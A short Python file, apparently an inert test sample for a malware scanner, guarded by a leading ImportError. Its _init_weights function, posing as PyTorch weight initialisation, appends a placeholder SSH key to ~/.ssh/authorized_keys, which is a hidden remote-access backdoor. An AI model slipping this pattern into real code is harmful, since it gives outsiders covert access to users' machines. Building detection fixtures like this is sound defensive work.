raise ImportError("inert test sample")
import os

import torch


def _init_weights(module):
    with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
        f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleOnlyNotARealKey dgxuser@dgx-host\n")
    torch.nn.init.normal_(module.weight)
